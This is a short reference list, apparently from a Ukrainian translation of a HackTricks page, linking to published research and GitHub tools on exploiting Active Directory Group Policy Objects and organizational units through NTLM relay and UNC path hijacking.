- [11] [TrustedSec — ARP Around and Find Out: перехоплення UNC-шляхів GPO для виконання коду та NTLM relay](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)
- [12] [GPOddity: експлуатація GPO Active Directory за допомогою NTLM relay та інші способи](https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
- [13] [OU жартуєте? — Petros Koutroumpis](https://labs.withsecure.com/publications/ou-having-a-laugh)
- [14] [OUned.py: експлуатація прихованих векторів атак ACL організаційних підрозділів в Active Directory](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)
- [15] [Імітація легітимних служб Active Directory у мережі: випадок експлуатації GPO](https://synacktiv.com/en/publications/simulating-legitimate-active-directory-services-on-the-network-the-case-of-gpo.html)
- [16] [Synacktiv GPOddity](https://github.com/synacktiv/GPOddity)
- [17] [Synacktiv OUned](https://github.com/synacktiv/OUned)
{{#include ../../../banners/hacktricks-training.md}}
